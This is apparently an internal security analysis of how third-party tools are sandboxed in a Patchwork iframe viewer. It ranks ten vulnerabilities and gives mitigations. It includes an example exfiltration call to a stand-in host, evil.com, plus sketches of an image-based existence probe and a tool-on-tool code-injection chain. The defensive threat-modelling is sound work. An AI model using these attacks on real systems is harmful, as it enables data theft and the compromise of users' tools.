# Security analysis: third-party tools in `isolated-patchwork-view`

> **Note:** The canonical threat model and design rationale live in [`core/DESIGN-tool-isolation.md`](../../../DESIGN-tool-isolation.md). This document catalogs specific vulnerabilities and their mitigations against that threat model.

## Threat model

Our chief concern is mischievous or malicious tool authors. We want to prevent two attacks:

1. **Unauthorized data access** — a tool accessing data not handed to it by the user, including documents of other tools (which could damage the user's environment).
2. **Data exfiltration** — a tool sending data it was given by the user to external servers or other unauthorized parties.

A third-party tool runs inside a **srcdoc iframe** with `sandbox="allow-scripts"` (no `allow-same-origin`). It gets an opaque origin, a CSP starting from `default-src 'none'`, and three MessagePort channels: repo sync, bootstrap (closed early), and capnweb RPC.

Sidebar and document toolbar tools are currently assumed trusted — isolating them is future work. This analysis focuses on document-area tools rendered via `isolated-patchwork-view` using the `isolated-frame` pattern.

## Vulnerability summary

| # | Vulnerability | Severity | Exploitability |
|---|---|---|---|
| 1 | Plugin entry module executes in host context | **Critical** | Trivial — side effects in index module |
| 2 | Unrestricted repo document access | **Medium** — see notes | Requires knowing document IDs |
| 3 | ~~`AllowAllPolicy` enables exfiltration via RPC~~ | ~~High~~ **Mitigated** | `RestrictivePolicy` is now the default |
| 4 | ~~`onOpenDocument` unvalidated navigation~~ | ~~Medium~~ **Mostly mitigated** | Navigation always targets `isolated-patchwork-view` |
| 5 | Browser-initiated loads bypass policy | **Low** | Limited to existence probing — acceptable for threat model |
| 6 | Registry leaks workspace metadata | **Low** | Acceptable if exfiltration is prevented |
| 7 | Indirect IndexedDB corruption via repo | Covered by #2 | Same as #2 |
| 8 | `unsafe-eval` CSP | **Low** | Amplifier, not standalone |
| 9 | `postMessage("*")` race | **Low** | Unlikely in practice |
| 10 | `suggestedImportUrl` exposes tool source URLs | **Medium** | Trivial — read `doc["@patchwork"].suggestedImportUrl` |

## 1. Plugin entry module executes in host context (CRITICAL)

**Location:** `patchwork-next/core/bootloader/src/site.ts` (ModuleWatcher `onModuleLoaded` callback)

When a plugin is installed, `ModuleWatcher` discovers it and calls `importModuleFromFolderDocUrl()` to load its entry point module. This runs in the **host page context** — not inside any iframe sandbox. The host then reads `mod.plugins` from the module's exports and passes the array to `registerPlugins()`, which only stores metadata.

The `registerPlugins()` call itself is safe — it just stores description objects. The problem is the step before it: the entry module is `import()`-ed and its top-level code executes in the host context with full access to the host DOM, IndexedDB, network, and every other browser API.

**Attack:** A malicious plugin puts side effects in its entry module (the file that exports the `plugins` array). For well-behaved plugins this file just defines metadata with a lazy `load: async () => (await import('./tool')).default`, but nothing enforces this. A malicious entry module can:

- **Access the host's DOM** — read or modify the page, inject scripts, intercept events.
- **Access the host's IndexedDB** — read, modify, or delete any database, including the Automerge document store.
- **Make arbitrary network requests** — exfiltrate data to external servers (no CSP restriction in the host context).
- **Access the host's Automerge Repo** — if the repo is reachable from module scope (e.g., as a global or via a closure), the plugin can read/write any document.
- **Tamper with other plugins** — modify the plugin registry, monkey-patch shared modules, intercept RPC channels.

**Impact:** Complete host compromise. The iframe sandbox is irrelevant because the code runs before any isolation boundary is involved.

**Why this is worse than the other vulnerabilities:** All other vulnerabilities in this document assume the attacker's code runs inside the sandboxed iframe. This one bypasses the sandbox entirely — the attacker's code runs with the same privilege as the host application itself.

**Mitigation:** The entry module must not be executed in the host context. Options include:

- **Static metadata extraction** — require plugins to declare metadata in `package.json` (or a separate JSON manifest) rather than in executable JavaScript. The host reads the manifest without importing the module. Module code is only ever loaded inside the sandboxed iframe.
- **Sandboxed discovery** — run `ModuleWatcher` module imports inside a sandboxed iframe or worker, extract the `plugins` array via structured clone / RPC, and register it in the host without ever evaluating the module in the host context.
- **Code review gate** — if the above are too complex short-term, require manual review/approval of plugin entry modules before they are imported. This is a process control, not a technical control.

## 2. Unrestricted Automerge document access (MEDIUM)

**Location:** `srcdoc.ts:217–225`, `index.ts:560–567`

The iframe's ephemeral Repo is connected directly to the host Repo via `MessageChannelNetworkAdapter` with no document-level filtering. The iframe repo uses `sharePolicy: () => true` (Automerge's default: share generously with all connected peers). The host repo also uses a generous share policy, meaning it will respond to sync requests for any document.

**Severity reassessment:** The iframe has no network access, so a tool can only sync documents whose IDs it already knows. There are four ways a tool can obtain document IDs (see DESIGN doc section 5 for full analysis):

1. **Provided by the host** — the document URL the tool was opened with, plus documents discovered through authorized navigation (e.g., folder children). Authorized access is acceptable; the concern is preventing leakage of unrelated document IDs.
2. **Provided by the user** — the user inputs a URL or drags in a document. This is authorized access.
3. **Hard-coded in tool source** — a malicious tool could embed automerge URLs to target specific documents. This is unauthorized access and an exfiltration vector (write stolen data to the hard-coded document, exfiltrate via sync).
4. **Brute force** — guessing valid automerge URLs. Low probability given the address space.

**Impact:** A tool that knows a document ID can read and write it via `repo.find()` + `handle.change()`. The severity depends on how many unauthorized document IDs the tool can obtain — which is gated by other vulnerabilities (hard-coded URLs in source, `suggestedImportUrl` leaks, etc.).

**Mitigation directions:** See DESIGN doc section 5 for detailed analysis. Rather than a heavy-handed document allowlist (which would interfere with legitimate tool use), the preferred approach is to address unauthorized document ID discovery at its sources: preventing hard-coded automerge URLs in tool source, removing `suggestedImportUrl` from document content, and ensuring the host doesn't leak document IDs through the RPC channel.

## 3. ~~`AllowAllPolicy` on `loadModuleSource` / `fetchResource`~~ (MITIGATED)

**Status:** Fixed. `RestrictivePolicy` is now the default.

**What was wrong:** The default `ResourcePolicy` was `AllowAllPolicy`, which returned `true` for every URL. Since `HostApi.loadModuleSource()` and `HostApi.fetchResource()` call `fetch()` on the host page's origin, a tool could call `hostStub.fetchResource("https://evil.com/exfil?data=...")` and the host would perform the fetch, bypassing the iframe's CSP entirely. This enabled data exfiltration, SSRF-style probing, and reading host-origin resources (including automerge documents via service worker URL resolution).

**What changed:** `RestrictivePolicy` (`resource-policy.ts`) is now the default policy, created per iframe with the host origin and resolved importmap URLs. It enforces three rules:

1. **Importmap URLs are always allowed** — the known set of framework/library module URLs resolved at init time.
2. **Cross-origin URLs are blocked** — `parsed.origin !== hostOrigin` rejects requests to external servers. Relative URLs (e.g., `/assets/foo.wasm`) are resolved against the host origin before checking, so legitimate same-origin paths pass.
3. **Automerge document IDs in URL paths are blocked** — each path segment is URI-decoded and rejected if it starts with `automerge:`, preventing tools from reading documents via the host's service worker URL resolution.

Opaque `__plugin__/` URLs are resolved by `OpaqueUrlMapper.toReal()` before the policy check and bypass it entirely — this is correct, as those are the host's own mapping for tool source code.

**Remaining work:** The current `RestrictivePolicy` is a blunt instrument. It needs to become more fine-grained and tool-specific — for example, some tools need access to specific external URLs (e.g., OpenRouter for LLM tools). See DESIGN doc section 7 for discussion of tool-specific resource whitelisting.

**Residual risk:** The policy allows all same-origin non-automerge paths. A tool could probe for the existence of host-served static assets. This is low-severity since the assets are public to any same-origin code anyway.

## 4. ~~`onOpenDocument` has no validation~~ (MOSTLY MITIGATED)

**Location:** `index.ts:371–385`, `site.ts:447–486`

**Status:** Mostly mitigated by architecture. The main document view is always rendered inside `<isolated-patchwork-view>`, so `onOpenDocument` navigation always targets the sandboxed iframe — not a trusted host context.

**What was wrong:** The RPC method `onOpenDocument(url, toolId?, title?, docType?)` dispatches an `OpenDocumentEvent` with no validation. The original concern was that a malicious tool could force navigation to a document using a trusted, non-sandboxed tool (e.g., a sidebar tool), escalating privileges.

**Why this is now mostly mitigated:** The host handler in `site.ts:447–465` updates `window.location.hash`, which causes `<isolated-patchwork-view>` to re-render with the new document. Since the target document always opens inside the sandbox, the `toolId` parameter cannot be used for privilege escalation — the chosen tool still runs in the sandboxed iframe with the same restrictions.

**Residual risks (Low):**

- **UI spoofing** — the host handler sets `document.title` from the tool-supplied `title` parameter (`site.ts:480`), which could mislead the user about which document they're viewing.
- **Unwanted navigation** — a tool can silently navigate the user away from their current document. This is disorienting but not a privilege escalation.
- **Host-side `repo.find()`** — the host handler calls `repo.find()` on the requested URL (`site.ts:468`) to resolve the document title. This runs on the host repo (not the iframe's), so even with `FilteredBridge` wired up, a malicious tool could cause the host to load arbitrary documents into memory. The tool doesn't get the data back, but it's a minor information-theoretic concern.

**Optional hardening:** Basic validation (is the URL a valid automerge URL? is `toolId` a known registry entry?) would address the residual risks but is no longer security-critical.

## 5. Browser-initiated loads bypass ResourcePolicy (LOW)

**Location:** `srcdoc.ts:362–375`

CSP allows `img-src`, `style-src`, `font-src`, `media-src` from the host origin. These are real HTTP requests that hit the host's server/service worker directly, bypassing the RPC `ResourcePolicy`.

**Attack:** A tool inserts `<img src="http://host-origin/%automerge%3Axyz.../sensitive-file">` — the browser fetches it directly from the host. The tool can observe `onload`/`onerror` to probe for resource existence, and observe timing.

**Threat model assessment:** The tool cannot read the response content as data (CSP blocks `connect-src`), only detect existence via load/error events. This is a limited information leak, not full exfiltration, and is acceptable for our threat model.

**Optional hardening:** The host's service worker could restrict automerge URL resolution to the RPC channel only, or require per-session authentication on automerge URL paths.

## 6. `PluginRegistryCapability` leaks metadata (LOW)

**Location:** `index.ts:223–268`, `rpc-types.ts:46–76`

The `PluginRegistryCapability` lets the iframe call `list("patchwork:tool")` and `list("patchwork:datatype")` to enumerate all registered plugins and datatypes. While importUrls are opaque, the metadata includes `id`, `name`, `supportedDatatypes`, `tags`, etc.

**Attack:**

- **Enumeration:** A malicious tool learns every tool and datatype installed in the user's workspace, which reveals what kinds of documents they work with.
- **`getFallbackTool(docUrl)` / `getSupportedTools(docUrl)`** — accepts an arbitrary `docUrl`, so a tool can probe whether a document exists and what type it is, even if it wasn't authorized to access that document.

**Threat model assessment:** This is a low-severity information disclosure. The metadata contains names, IDs, and supported datatypes, but no document content or real automerge document IDs (those are opaque in `importUrl`). This is acceptable as long as exfiltration is successfully prevented — the tool can learn what's installed but cannot send that information anywhere.

**Optional hardening:** Scope registry queries to the tool's own context — e.g., only allow `getFallbackTool` for documents the tool is authorized to access.

## 7. IndexedDB: not directly vulnerable, but reachable through repo

**Location:** `srcdoc.ts:217` (Repo created with no storage adapter)

The srcdoc iframe has an opaque origin so it cannot access the host's IndexedDB directly. The iframe's ephemeral Repo is created without `IndexedDBStorageAdapter`. Good — this is safe.

**However:** The host Repo connected via `MessageChannelNetworkAdapter` at `index.ts:562` is backed by IndexedDB. A tool that knows a document ID can use `repo.find()` to sync it from IndexedDB via the host repo. The tool doesn't touch IndexedDB directly, but has read/write access to any document it can discover (see #2 for how document IDs can be obtained).

**Clearing IndexedDB:** A tool cannot directly call `indexedDB.deleteDatabase()` on the host's databases (opaque origin prevents it). But a tool could corrupt document contents via `handle.change()` on any document it has a handle to, which the host repo would persist to IndexedDB.

Note that vulnerability #1 (host-context plugin execution) makes this worse — a malicious plugin entry module runs in the host context and *can* call `indexedDB.deleteDatabase()` directly.

## 8. `eval` / dynamic code execution in the iframe (LOW)

**Location:** CSP `script-src 'unsafe-eval'` in `srcdoc.ts:364`

`unsafe-eval` is required by es-module-shims. A malicious tool can use `eval()` freely, but this is mainly a concern if combined with other vulnerabilities (e.g., if a tool can load arbitrary module source via `loadModuleSource`, it already has code execution — `eval` doesn't add much).

The real risk is that `eval` makes it easier for a compromised tool to execute obfuscated or dynamically constructed payloads, making static analysis of tool code harder.

## 9. `postMessage` init handshake race (LOW)

**Location:** `index.ts:583–602`

The init message is posted with `targetOrigin: "*"` (necessary because the srcdoc iframe has a null origin). If another frame could intercept this message, it would receive the three MessagePorts.

**In practice:** The iframe is created by the host element and there's an epoch guard, making interception unlikely. But `"*"` as targetOrigin is worth noting — any code with a reference to the iframe's `contentWindow` could theoretically race the message.

## 10. `suggestedImportUrl` exposes tool source document URLs (MEDIUM)

**Location:** `patchwork-plugins/src/datatypes.ts:60–63`, `patchwork-filesystem/src/metadata.ts:6`

Every document created via `createDocumentOfType()` stamps the raw automerge URL of its tool's source code package into the document content at `doc["@patchwork"].suggestedImportUrl`. This field is part of the document's CRDT state and syncs to any peer that has the document.

**Attack chain (requires #2):** A malicious tool running inside the iframe can:

1. Read `handle.doc()["@patchwork"].suggestedImportUrl` from any document it can sync — which today is all of them (vulnerability #2).
2. Use that automerge URL to call `repo.find()` on the tool source code document.
3. Call `handle.change()` to inject malicious code into the tool's source.
4. All users who subsequently load that tool get compromised.

This is a tool-on-tool attack: a malicious tool can modify the source code of other tools.

**Why this matters independently of #2:** The opaque URL mapping (`OpaqueUrlMapper`) carefully hides tool source document IDs from the iframe through the RPC and module-loading channels. `suggestedImportUrl` bypasses that protection entirely by embedding the real automerge URL in ordinary document content, which the iframe has direct access to via the repo channel.

**Interaction with FilteredBridge:** If vulnerability #2 is fixed (FilteredBridge with an allowlist), this vulnerability is largely neutralized — the tool can still *read* the URL from documents it's authorized to access, but it cannot `repo.find()` the tool source document unless that document is also on the allowlist (which it shouldn't be). However, the information leak itself remains: a tool learns the automerge URLs of other tools' source code, which could be useful in chained attacks.

**Mitigation:** Stop writing `suggestedImportUrl` into document content. Options:

- **Remove the field entirely** — use the plugin registry to resolve which tool handles a given document type. The `patchwork-view` `#notool()` fallback (`patchwork-view.ts:413–427`) already dispatches a `patchwork:no-tool` event that the host handles via `ModuleWatcher.loadSuggestedImportUrl()`. Replace this with a registry-based lookup that doesn't require the document to carry the URL.
- **Replace with a non-URL identifier** — store only the datatype ID (already in `doc["@patchwork"].type`), not the automerge URL of the tool source. The host can resolve the datatype ID to the correct tool package through the registry.
- **Strip the field at sync boundaries** — if the field must exist for backwards compatibility, the `FilteredBridge` could strip `suggestedImportUrl` from documents before syncing them to the iframe.

## What's already working well

- **Origin isolation** via `sandbox="allow-scripts"` (no `allow-same-origin`) — prevents direct access to host DOM, cookies, localStorage, IndexedDB, and service workers.
- **CSP from `default-src 'none'`** — blocks direct network access (`connect-src blob:` only), nested iframes, workers, plugins, and form submissions.
- **RestrictivePolicy** — blocks cross-origin exfiltration and automerge URL paths through the RPC fetch/load channels.
- **Opaque URL mapping** — automerge document IDs for tool source code never flow host → iframe through the module-loading path.
- **Bootstrap channel restrictions** — only serves importmap URLs, closed after capnweb loads.
- **Fetch proxy constraints** — GET/HEAD only, no request bodies.
- **capnweb RPC** — type-safe, capability-oriented; good foundation for tightening access over time.
- **Navigation isolation** — `onOpenDocument` always targets `<isolated-patchwork-view>`, preventing privilege escalation via forced navigation to trusted tool contexts.

## Recommended priority

See DESIGN doc sections 12–16 for full discussion of open problems.

1. **Stop executing plugin entry modules in the host context** — extract metadata from a static manifest or run discovery in a sandbox (fixes #1). Most severe gap — bypasses the entire isolation architecture.
2. **Remove `suggestedImportUrl` from document content** — stop leaking tool source code automerge URLs through CRDT state (fixes #10). Enables tool-on-tool attacks.
3. **Prevent hard-coded automerge URLs in tool source** — improve source rewriting or use other mechanisms to prevent tools from embedding automerge URLs that enable unauthorized document access and exfiltration-by-sync (partially addresses #2).
4. **Make `ResourcePolicy` tool-specific** — the current `RestrictivePolicy` is a blunt instrument. Some tools need access to specific external URLs. Needs a mechanism for per-tool resource whitelisting (improves #3).
5. ~~**Implement a real `ResourcePolicy`** that blocks external origins and automerge URL paths (fixes #3).~~ **Done** — `RestrictivePolicy` is now the default.
6. ~~**Validate `onOpenDocument` parameters** on the host side (fixes #4).~~ **Mostly done** — navigation always targets `isolated-patchwork-view`, so no privilege escalation is possible.
